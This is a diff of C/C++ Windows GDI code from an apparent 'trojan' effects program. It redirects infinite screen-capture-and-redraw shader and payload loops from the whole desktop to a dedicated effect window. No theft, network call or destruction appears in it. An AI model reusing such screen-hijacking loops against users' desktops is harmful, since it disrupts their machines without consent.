@@ -5,7 +5,7 @@
 #include "define.h"
 
 void ExecuteShader(TROJAN_SHADER shader, bool delay) {
-	HDC hdcScreen = GetDC(NULL);
+	HDC hdcScreen = GetDC(EffectDisplayWindow);
 	POINT ptScreen = GetVirtualScreenPos();
 	SIZE szScreen = GetVirtualScreenSize();
 
@@ -22,34 +22,25 @@ void ExecuteShader(TROJAN_SHADER shader, bool delay) {
 
 	prgbScreen = { 0 };
 
-	hdcTempScreen = CreateCompatibleDC(hdcScreen);
-	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
+	hdcTempScreen = CreateCompatibleDC(EffectDisplayDC);
+	hbmScreen = CreateDIBSection(EffectDisplayDC, &bmi, 0, (void**)&prgbScreen, NULL, 0);
 	SelectObject(hdcTempScreen, hbmScreen);
 
 	while (true) {
-		hdcScreen = GetDC(NULL);
-		BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
+		BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, EffectDisplayDC, 0, 0, SRCCOPY);
 		shader(szScreen.cx, szScreen.cy, prgbScreen);
-		BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
-		ReleaseDC(NULL, hdcScreen);
-		DeleteObject(hdcScreen);
+		BitBlt(EffectDisplayDC, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
 		if (delay == true) {
 			Sleep(10);
 		}
 	}
-
-	DeleteObject(hbmScreen);
 	DeleteDC(hdcTempScreen);
-	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
 	Sleep(100);
 }
 
 void ExecutePayload(TROJAN_PAYLOAD payload) {
 	while (true) {
-		HDC hdcScreen = GetDC(NULL);
-		payload(hdcScreen);
-		ReleaseDC(NULL, hdcScreen);
-		DeleteObject(hdcScreen);
+		payload(EffectDisplayDC);
 	}
 	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
 	Sleep(100);
